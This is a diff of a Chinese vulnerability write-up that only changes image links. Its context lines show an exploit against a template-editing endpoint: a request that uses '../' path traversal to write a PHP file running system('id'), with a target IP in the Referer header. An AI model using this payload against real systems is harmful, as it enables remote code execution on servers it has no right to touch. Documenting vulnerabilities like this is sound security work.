@@ -122,7 +122,7 @@ $ymlData = Spyc::YAMLLoad($_POST['code']);
     $fullpath = $config_templates_basedir+ .$fileName;
 ```
 
-![](image/rc-7.png)
+![](http://wikioss.peiqi.tech/vuln/rc-7.png)
 
 ```php
 $filehandle = fopen($fullpath, 'w+');
@@ -149,13 +149,13 @@ Referer: https://176.62.195.243/lib/ajaxHandlers/ajaxEditTemplate.php
 fileName=../www/pq.php&code=<?php echo system('id');?>&id=1
 ```
 
-![](image/rc-8.png)
+![](http://wikioss.peiqi.tech/vuln/rc-8.png)
 
 
 
 这里写入文件 **pq.php.yml**,并使用 **../** 跳出限制的目录，访问 pq.php.yml 实际访问了 pq.php，执行id命令
 
-![](image/rc-9.png)
+![](http://wikioss.peiqi.tech/vuln/rc-9.png)
 
 ## 漏洞POC
 
@@ -260,4 +260,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/rc-10.png)
+![](http://wikioss.peiqi.tech/vuln/rc-10.png)
